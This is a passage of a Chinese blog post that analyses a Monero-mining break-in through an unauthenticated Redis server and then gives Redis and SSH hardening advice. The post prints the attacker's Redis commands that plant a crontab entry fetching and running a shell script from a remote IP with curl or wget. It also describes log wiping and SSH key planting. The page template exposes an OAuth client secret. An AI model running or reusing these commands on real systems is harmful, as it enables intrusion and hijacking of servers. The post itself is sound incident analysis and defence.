+<p>接下来我们看下 DOWNLOAD 函数。该函数从 84.73.251.157 下载 <code>crondb</code> 和 <code>c.j</code> 文件，放到本地的 /tmp 目录。接下来执行关键的一步，<strong>/tmp/crondb -c /tmp/c.j -B</strong>。</p>
+<p>我们将 crondb 文件和 c.j 放到本地，对这个两个文件进行分析。</p>
+<p>上文提到 INFO 函数将获取 crondb 文件帮助信息。我们来执行下 INFO 函数的语句。</p>
+<pre><code>./crondb --help
+Usage: xmrig [OPTIONS]
+Options:
+  -a, --algo=ALGO          cryptonight (default) or cryptonight-lite
+  -o, --url=URL            URL of mining server
+  -O, --userpass=U:P       username:password pair for mining server
+  -u, --user=USERNAME      username for mining server
+  -p, --pass=PASSWORD      password for mining server
+  -t, --threads=N          number of miner threads
+  -v, --av=N               algorithm variation, 0 auto select
+  -k, --keepalive          send keepalived for prevent timeout (need pool support)
+  -r, --retries=N          number of times to retry before switch to backup server (default: 5)
+  -R, --retry-pause=N      time to pause between retries (default: 5)
+      --cpu-affinity       set process affinity to CPU core(s), mask 0x3 for cores 0 and 1
+      --cpu-priority       set process priority (0 idle, 2 normal to 5 highest)
+      --no-huge-pages      disable huge pages support
+      --no-color           disable colored output
+      --donate-level=N     donate level, default 5% (5 minutes in 100 minutes)
+      --user-agent         set custom user-agent string for pool
+  -B, --background         run the miner in the background
+  -c, --config=FILE        load a JSON-format configuration file
+  -l, --log-file=FILE      log all output to a file
+  -S, --syslog             use system log for output messages
+      --max-cpu-usage=N    maximum CPU usage for automatic threads mode (default 75)
+      --safe               safe adjust threads and av settings for current CPU
+      --nicehash           enable nicehash/xmrig-proxy support
+      --print-time=N       print hashrate report every N seconds
+      --api-port=N         port for the miner API
+      --api-access-token=T access token for API
+      --api-worker-id=ID   custom worker-id for API
+  -h, --help               display this help and exit
+  -V, --version            output version information and exit
+</code></pre><p>看到 Usage 这一步，再去 GitHub 项目搜索，我们可以得知 <a href="https://github.com/xmrig/xmrig" target="_blank" rel="noopener">xmrig</a> 是用于 Monero (XMR) CPU 挖矿的。接下来我们看下 c.j 文件，从 <strong>/tmp/crondb -c /tmp/c.j -B</strong> 得知。-c 参数表示配置文件，-B 表示后台运行。也就是说 c.j 是一个配置文件。我们打开 c.j 文件，看到关键的 pools 配置，可以得知 user 配置如下：</p>
+<blockquote>
+<p>423DEFLqFZwb4gm9fMHVY8dm8KMFXhkMHg5FBwi9nXfS6P5LCd7cArbV83Cmmwi7ouBHihZS74ckNbRDyGNruQAFBnNCeNK</p>
+</blockquote>
+<p>我们推测这是个 Monero (XMR) 钱包。</p>
+<p>我们把 crondb 上传到 virscan.org，分析得出，详细的报告点击 <a href="http://r.virscan.org/report/c2ab5fa44a1a0f8545260c7aedc751aa" target="_blank" rel="noopener">这里</a>，其中 ikarus 标记为 PUA.CoinMiner，qh360 标记为 Win32/Virus.DoS.dc1，rising 标记为 Trojan.Linux.XMR-Miner。这也印证了这是个用于挖矿的可执行文件。</p>
+<p>我们接着分析。接下来就是一些毁灭性的工作：</p>
+<ul>
+<li>清空 /var/log/wtmp</li>
+<li>清空 /var/log/secure</li>
+<li>清空历史执行命令</li>
+<li>修改包含 linuxsyn、clay、udevs、psql、smartd、redisscan.sh、ebscan.sh、gpg-agent、gpg-agentd、kethelper 文件的权限为 0644</li>
+<li>清空 /tmp/unixinfect/imworking 文件</li>
+</ul>
+<p>CLEAN 函数也是一个毁灭性的函数。首先会修改 /etc/security/limits.conf 和 /etc/sysctl.conf 系统配置文件。加入如下配置：</p>
+<pre><code class="bash">* soft memlock 262144
+* hard memlock 262144
+vm.nr_hugepages = 256
+</code></pre>
+<p>接下来删除 RMLIST 列表的文件，kill 掉 KILIST 列表的进程。KILIST 里有些什么呢？也是挖矿的钱包地址或者相关的进程。这位哥们只想自己获利，不关心兄弟的死活，呵呵。接下来执行疯狂的 kill，也是挖矿钱包地址或者相关的进程，不过这个列表就有点多了，在此不赘述。</p>
+<p>我们继续分析。INIT 函数修改 nr_hugepages 内核配置，ITABLE 函数删除掉 6379 端口相关的防火墙，允许本地连接，接下来 CRON 函数跟上文所述功能一致，在此不赘述。</p>
+<p>最后做了脚本优化，如果发现没有 /tmp/crondb 和 /tmp/c.j 文件，继续下载。如果你的系统 GLIBC 版本不满足它的需求，还会帮你升级，加载到 LD_LIBRARY_PATH。接着将他自己的 key 写入到 authorized_keys 文件，这样它可以免密登陆，方便后续的操作。最后再清空 /var/log/wtmp、清空 /var/log/secure、清空历史执行命令。</p>
+<p>由于 Monero (XMR) 不可追溯性，读者无法通过钱包地址追溯交易记录，也就是说我们无从得知黑客从中获益多少。</p>
+<h2 id="0x02-服务器被黑分析"><a href="#0x02-服务器被黑分析" class="headerlink" title="0x02 服务器被黑分析"></a>0x02 服务器被黑分析</h2><hr>
+<p>分析到这里，我们对挖矿过程过程比较清楚了。但问题是，服务器为什么会被黑呢？</p>
+<p>从刚才的分析得知，该脚本会处理 6379 端口，6379 端口是我们熟知的 Redis 端口。Redis 作者 antirez 很早之前写过一篇文章：<a href="http://antirez.com/news/96" target="_blank" rel="noopener">A few things about Redis security</a>，文中提到未授权访问漏洞，具体的漏洞可以参考这篇文章。</p>
+<p>由于 VPS 服务器 Redis 端口没有添加密码，防火墙虽然开启，但防火墙开放权限过大，导致黑客趁机攻击。具体操作流程是怎么样的呢？</p>
+<p>第一，扫描到该 VPS IP 存在 6379 Redis 端口，尝试无密码登陆。</p>
+<p>第二，依次执行如下命令。</p>
+<pre><code class="bash">set key1 &quot;\n*/5 * * * * curl -fsSL http://84.73.251.157:81/bar.sh | sh\n&quot;
+set key2 &quot;\n*/5 * * * * wget -q -O- http://84.73.251.157:81/bar.sh | sh\n&quot;
+config set dir /var/spool/cron/
+config set dbfilename root
+save
+</code></pre>
+<p>第三，Linux 服务器自动加载到 crontab，然后定时任务执行 bar.sh 脚本，服务器被动用于挖矿。</p>
+<p>由于 Redis 开启了 AOF，我们利用如下的脚本将 AOF 回溯 [1]，可以确认写入 KEY 的键值对。</p>
+<pre><code class="python">#!/usr/bin/env python
+
+&quot;&quot;&quot; A redis appendonly file parser
+&quot;&quot;&quot;
+
+import logging
+import hiredis
+import sys
+
+if len(sys.argv) != 2:
+   print sys.argv[0], &#39;aof_file&#39;
+   sys.exit()
+file = open(sys.argv[1])
+line = file.readline()
+cur_request = line
+while line:
+    req_reader = hiredis.Reader()
+    req_reader.setmaxbuf(0)
+    req_reader.feed(cur_request)
+    command = req_reader.gets()
+    try:
+        if command is not False:
+            print command
+            cur_request = &#39;&#39;
+    except hiredis.ProtocolError:
+        print &#39;protocol error&#39;
+    line = file.readline()
+    cur_request += line
+file.close
+</code></pre>
+<p>分析到此为止，我们可以从中得知，未授权漏洞是相当危险的，只要有这个口子，黑客可以做任何事情。</p>
+<p>就在最近，一个朋友的服务器也有类似的现象。脚本可以参考：<a href="https://github.com/BlockchainOne/crack-mining/tree/master/v2" target="_blank" rel="noopener">crack-mining v2</a>。脚本大同小异，不过用于挖矿的可执行文件做了手脚。除了 Usage 这里的名字不一样，其他都是一样的。</p>
+<p><img src="https://i.imgur.com/oXJizEC.jpg" alt="dump.db"></p>
+<p>同样，上传到 <a href="http://virscan.org" target="_blank" rel="noopener">virscan.org</a>，得到的报告，点击 <a href="http://r.virscan.org/report/fc17f9c18266646045fcd0375279bf34" target="_blank" rel="noopener">此处</a> 阅读。</p>
+<h2 id="0x03-防御方案"><a href="#0x03-防御方案" class="headerlink" title="0x03 防御方案"></a>0x03 防御方案</h2><hr>
+<p>黑客作案手法我们已经清楚，那怎么样才能防御呢？笔者在这里给出自己的思考。</p>
+<h3 id="3-1-Redis-方面"><a href="#3-1-Redis-方面" class="headerlink" title="3.1 Redis 方面"></a>3.1 Redis 方面</h3><hr>
+<p>Redis 作者在 <a href="http://antirez.com/news/96" target="_blank" rel="noopener">A few things about Redis security</a> 一文中提到，Redis 因配置不当可以导致未授权访问，被攻击者恶意利用。当前流行的针对 Redis 未授权访问的一种新型攻击方式，在特定条件下，如果 Redis 以 root 身份运行，黑客可以给 root 账户写入 SSH 公钥文件，直接通过 SSH 登录受害服务器，或者写入 crontab 定时任务，运行有危害的服务。这些攻击可能导致服务器权限被获取和数据删除、泄露或加密勒索事件发生，严重危害业务正常服务。[2]</p>
+<p><strong>第一，网络层加固</strong>，通常有如下两种方式：</p>
+<ul>
+<li>Redis 默认绑定在 0.0.0.0，也就是所有的 IP 都能访问。建议的做法是配置文件添加 bind 参数，允许本机以及内网 IP 地址访问，比如</li>
+</ul>
+<pre><code class="bash">bind 127.0.0.1 192.168.0.1
+</code></pre>
+<p>注：Redis 从 2.8.0 版本开始，支持双 IP 绑定。</p>
+<ul>
+<li>设置防火墙策略，比如：</li>
+</ul>
+<pre><code class="bash">iptables -A INPUT -s x.x.x.x -p tcp --dport 6379 -j ACCEPT
+</code></pre>
+<p><strong>第二，账号与认证</strong></p>
+<p>设置访问密码，配置文件添加 requirepass，这个配置可以在线修改，配置完成之后，执行 CONFIG REWRITE 持久化到配置文件。</p>
+<p><strong>第三，服务运行权限最小化</strong></p>
+<p>Redis 默认使用 root 账号运行，但这会带来不可控的风险。我们希望用较低权限的用户来运行 Redis，实现账户隔离，保障 Redis 服务以及主机的安全。</p>
+<p>调整如下：</p>
+<pre><code class="bash"># 创建 redis 用户组
+groupadd -r redis
+# 添加 redis 用户，指定为系统用户，并且默认 Shell 改为 /sbin/nologin
+useradd -c &quot;Redis&quot; -d /var/lib/redis -g redis -m -r -s /sbin/nologin redis
+# 更改 Redis 主目录的权限
+chown redis:redis -R /opt/redis
+# 更改 Redis 相关程序的权限
+chown redis:redis /usr/local/bin/redis*
+</code></pre>
+<p>最后再以 Redis 用户启动实例。</p>
+<pre><code class="bash">su -s /bin/bash redis -c &quot;/usr/local/bin/redis-server /opt/redis/$port/redis.conf&quot;
+</code></pre>
+<p><strong>第四，服务精细化授权</strong></p>
+<p>Redis 没有账户权限系统，为了避免入侵之后服务级命令需要重命名或者屏蔽。</p>
+<p>高危的命令如下：</p>
+<ul>
+<li>FLUSHDB</li>
+<li>FLUSHALL</li>
+<li>KEYS</li>
+<li>PEXPIRE</li>
+<li>DEL</li>
+<li>CONFIG</li>
+<li>SHUTDOWN</li>
+<li>BGREWRITEAOF</li>
+<li>BGSAVE</li>
+<li>SAVE</li>
+<li>SPOP</li>
+<li>SREM</li>
+<li>RENAME</li>
+<li>DEBUG</li>
+<li>EVA</li>
+</ul>
+<p>我们可以在配置文件添加对上述命令重命名或者屏蔽。</p>
+<pre><code class="bash"># 屏蔽 CONFIG 命令
+rename-command CONFIG &quot;&quot;
+
+# 重命名 CONFIG 命令
+rename-command CONFIG &quot;XKGLx9LFl87mQQLVl0b7UI4VZJESG5iU&quot;
+</code></pre>
+<p><strong>第五，安全补丁</strong></p>
+<p>关注官方版本的变化以及漏洞列表，及时修补，必要时进行升级。</p>
+<p><strong>第六，业务隔离。</strong></p>
+<p>生产环境建议将 Redis 环境部署到内网，并且该服务器没有公网 IP。不过 VPS 一般都有公网 IP，如果 VPS 有 Redis 服务的，务必重视安全。</p>
+<h3 id="3-2-服务器方面"><a href="#3-2-服务器方面" class="headerlink" title="3.2 服务器方面"></a>3.2 服务器方面</h3><hr>
+<p>除了 Redis 本身，服务器方面我们也有很多安全策略。</p>
+<p><strong>第一，服务器不使用默认的 22 端口</strong>。22 端口是 SSH 服务的默认端口，这也是黑客扫描服务器 ssh 服务的默认端口。修改 SSH 端口的方法如下：vim 编辑 <code>/etc/ssh/sshd_config</code>，将其中的 <code>Port 22</code> 参数改成你想要的端口，通常 5 位数字最好。修改完成之后，重启 sshd 服务生效。</p>
+<p><strong>第二，禁止使用密码登陆，使用 RSA 公钥登陆</strong>。本地机器可以使用 <code>ssh-keygen -t rsa</code> 生成公钥和私钥，然后将公钥追加到服务器上的 ~/.ssh/authorized_keys 文件，注意此文件的权限是 600。SSH 配置如下：</p>
+<pre><code class="bash">RSAAuthentication yes # RSA认证
+PubkeyAuthentication yes # 开启公钥验证
+AuthorizedKeysFile .ssh/authorized_keys # 验证文件路径
+PasswordAuthentication no # 禁止密码认证
+PermitEmptyPasswords no # 禁止空密码
+</code></pre>
+<p>最后重启 sshd 服务即可生效。</p>
+<p><strong>第三，禁止 root 用户登录</strong>。线上服务器，我们通常会以普通用户登陆，然后再 su - root 切换到 root 用户，这样做的好处是，即使被攻击了，也能有相应的保障。具体的方法是修改 <code>/etc/ssh/sshd_config</code> 配置文件，将 <code>PermitRootLogin</code> 改为 no。</p>
+<p><strong>第四，添加服务器监控</strong>。针对本文的案例，特别注意 CPU 告警。另外，还需要监测异常进程。</p>
+<p><strong>第五，开启防火墙</strong>。有公网 IP 的服务器，防火墙策略一定要做好。通常我们会限定 IP、限定端口，可以是特定的 IP 或者端口，也可以是 IP 或者端口范围，但切记开放某个 IP 段。</p>
+<p><strong>第六，只从官方获取软件</strong>。非官方渠道的软件很有可能被加入其他木马文件。正确的做法是只从官方下载，下载下来还要检查下文件的 MD5 值是否和官方公布的一致。</p>
+<p><strong>第七，可以使用类似 <a href="https://github.com/fail2ban/fail2ban" target="_blank" rel="noopener">fail2ban</a> 对服务器安全进行加固</strong>。它会监控多个系统的日志文件，并根据检测到的任何可疑的行为自动触发不同的防御动作。</p>
+<h3 id="3-3-其他服务"><a href="#3-3-其他服务" class="headerlink" title="3.3 其他服务"></a>3.3 其他服务</h3><hr>
+<p>如果 VPS 服务器部署了 MySQL 等服务，这里也有很多安全措施。比如删除匿名账户、删除 test 库、权限最小化等。如果对 MySQL 安全感兴趣的可以参考 <a href="http://imysql.com/2016/03/15/sth-about-mysql-data-security.shtml" target="_blank" rel="noopener">此文</a>。</p>
+<h3 id="3-4-日常用户"><a href="#3-4-日常用户" class="headerlink" title="3.4 日常用户"></a>3.4 日常用户</h3><hr>
+<p>对于没有 VPS 服务器的群友，那怎么样做好安全呢？即使没有 VPS 服务器，你的 PC 或者 Mac 也有可能被黑，用于挖矿。之前写过一篇 <a href="https://dbarobin.com/2017/12/18/blockchain-security-notice/" target="_blank" rel="noopener">区块链资产安全攻略</a>，读者可以参考下。针对本文的案例，这里笔者提出几点建议：</p>
+<ul>
+<li>不要下载未知软件。</li>
+<li>关注 PC 或者 Mac 动态，PC 有任务管理器，Mac 有 Activity Monitor，通常电脑被用于挖矿，CPU 资源会相当紧张。</li>
+<li>使用 Chrome 等浏览器，谨慎访问网站。说不定你经常访问的网站哪天就被植入挖矿脚本。</li>
+<li>PC 关闭远程桌面共享、文件共享，Mac 关闭访客账户、文件共享、远程登陆。有需要使用时才打开，但用完之后立马关闭。</li>
+</ul>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><hr>
+<p>本篇文章从一起服务器被黑事件说起，分析了挖矿脚本、被黑过程，以及从 Redis 、服务器、其他服务、日常用户等方面给出了防御方案。除了 Redis 的未授权访问漏洞，目前主要存在未授权访问漏洞的还有：NFS，Samba，LDAP，Rsync，FTP，GitLab，Jenkins，MongoDB，ZooKeeper，ElasticSearch，Memcache，CouchDB，Docker，Solr，Hadoop，Dubbo 等，<strong>安全重于泰山，读者千万不要掉以轻心。</strong></p>
+<p>对本文涉及到的攻击脚本感兴趣的读者，可以去 GitHub clone 看看。repo 链接：</p>
+<ul>
+<li><a href="https://github.com/BlockchainOne/crack-mining" target="_blank" rel="noopener">crack-mining</a></li>
+</ul>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><hr>
+<ul>
+<li>[1] 白宸 (2016-11-17). Redis 协议简介及持久化 Aof 文件解析. Retrieved from <a href="https://yq.aliyun.com/articles/64345" target="_blank" rel="noopener">https://yq.aliyun.com/articles/64345</a>.</li>
+<li>[2] 阿里云 (2017-12-04). Redis 服务安全加固. Retrieved from <a href="https://help.aliyun.com/knowledge_detail/37447.html" target="_blank" rel="noopener">https://help.aliyun.com/knowledge_detail/37447.html</a>.</li>
+</ul>
+<p>「区块链技术指北」同名 <strong>知识星球</strong>，二维码如下，欢迎加入。BTW，<strong>李笑来老师也加入了</strong>。</p>
+<p><img src="https://i.imgur.com/pQxlDqF.jpg" alt="区块链技术指北"></p>
+<p>「区块链技术指北」相关资讯渠道：</p>
+<ul>
+<li>「区块链技术指北」同名知识星球，<a href="https://t.xiaomiquan.com/ZRbmaU3" target="_blank" rel="noopener">https://t.xiaomiquan.com/ZRbmaU3</a></li>
+<li>官方社区，<a href="https://bbs.chainon.io" target="_blank" rel="noopener">https://bbs.chainon.io</a></li>
+<li>Telegram Channel，<a href="https://t.me/BlockchainAge" target="_blank" rel="noopener">https://t.me/BlockchainAge</a></li>
+<li>Telegram Group，<a href="https://t.me/bcage" target="_blank" rel="noopener">https://t.me/bcage</a></li>
+<li>Twitter，<a href="https://twitter.com/bcageone" target="_blank" rel="noopener">https://twitter.com/bcageone</a></li>
+<li>新浪微博，<a href="https://weibo.com/BlockchainAge" target="_blank" rel="noopener">https://weibo.com/BlockchainAge</a></li>
+</ul>
+<p>同时，本系列文章会在以下渠道同步更新，欢迎关注：</p>
+<ul>
+<li>「区块链技术指北」同名微信公众号（微信号：BlockchainAge）</li>
+<li>个人博客，<a href="https://dbarobin.com" target="_blank" rel="noopener">https://dbarobin.com</a></li>
+<li>知乎，<a href="https://zhuanlan.zhihu.com/robinwen" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/robinwen</a></li>
+<li>Steemit，<a href="https://steemit.com/@robinwen" target="_blank" rel="noopener">https://steemit.com/@robinwen</a></li>
+<li>Medium，<a href="https://medium.com/@robinwan" target="_blank" rel="noopener">https://medium.com/@robinwan</a></li>
+<li>掘金，<a href="https://juejin.im/user/5673ccae60b2260ee435f89a/posts" target="_blank" rel="noopener">robinwen@juejin.im</a></li>
+<li>币乎，<a href="https://bihu.com/people/12109" target="_blank" rel="noopener">https://bihu.com/people/12109</a></li>
+</ul>
+<p>原创不易，读者可以通过如下途径打赏，虚拟货币、美元、法币均支持。</p>
+<ul>
+<li>BTC: 3QboL2k5HfKjKDrEYtQAKubWCjx9CX7i8f</li>
+<li>ERC20 Token: 0x8907B2ed72A1E2D283c04613536Fac4270C9F0b3</li>
+<li>PayPal: <a href="https://www.paypal.me/robinwen" target="_blank" rel="noopener">https://www.paypal.me/robinwen</a></li>
+<li>微信打赏二维码</li>
+</ul>
+<p><img src="https://i.imgur.com/SzoNl5b.jpg" alt="Wechat"></p>
+<p>–EOF–</p>
+<p>版权声明：<a href="http://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" target="_blank" rel="noopener">自由转载-非商用-非衍生-保持署名（创意共享4.0许可证）</a></p>
+
+        
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 Gitalk -->
+<div id="gitalk-comment">
+    <!-- Gitalk 评论框 -->
+<div id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script type="text/javascript" src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+
+<script>
+    var gitalk = new Gitalk({
+            clientID: 'f5d48c610cdf262e4f5c',
+            clientSecret: '52171aebeb6b254d1d599a10c411a3855650f4d2',
+            repo: 'BlockchainOne.github.io',
+            owner: 'BlockchainOne',
+            admin: ['dbarobin'],
+			id: md5(location.pathname),
+            // facebook-like distraction free mode
+            distractionFreeMode: false
+        })
+   gitalk.render('gitalk-container')
+</script>
+
+</div>
+<style>
+    #gitalk-comment {
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2018/03/11/chainone-wechat-issue-13/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/2018/03/04/chainone-wechat-issue-12/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+
+            <!-- ad start -->
+            
+            <!-- ad end -->
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.jpg" alt="ChainONE's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        chainone.org@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="chainone.org@gmail.com" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2020/06/">六月 2020<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/05/">五月 2020<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/04/">四月 2020<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/03/">三月 2020<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/02/">二月 2020<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2020/01/">一月 2020<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/12/">十二月 2019<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/11/">十一月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/10/">十月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/09/">九月 2019<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/08/">八月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/07/">七月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/06/">六月 2019<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/05/">五月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/04/">四月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/03/">三月 2019<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/02/">二月 2019<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/01/">一月 2019<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/09/">九月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">7</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/02/">二月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/01/">一月 2018<span class="sidebar_archives-count">12</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">16</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">chrome_reader_mode</i>
+                
+                分类
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+                <li>
+                <a class="sidebar_archives-link" href="/categories/Blockchain/">Blockchain<span class="sidebar_archives-count">32</span></a></li><li><a class="sidebar_archives-link" href="/categories/EOS/">EOS<span class="sidebar_archives-count">8</span></a></li><li><a class="sidebar_archives-link" href="/categories/WeChat/">WeChat<span class="sidebar_archives-count">128</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Pages  -->
+    
+
+    <!-- Article Number  -->
+    
+        <li>
+            <a href="/archives">
+                文章总数
+                <span class="sidebar-badge">168</span>
+            </a>
+        </li>
+        
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/bcageone" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+
+    <!-- Weibo -->
+    
+        <a href="https://weibo.com/BlockchainAge" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+        <a href="https://github.com/BlockchainOne" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-github">
+                <span class="visuallyhidden">Github</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+        <a href="https://zhuanlan.zhihu.com/robinwen" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-zhihu">
+                <span class="visuallyhidden">Zhihu</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+        <a href="https://t.me/chainone" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-telegram">
+                <span class="visuallyhidden">Telegram</span>
+            </button><!--
+     --></a>
+    
+    
+    <!-- V2EX -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
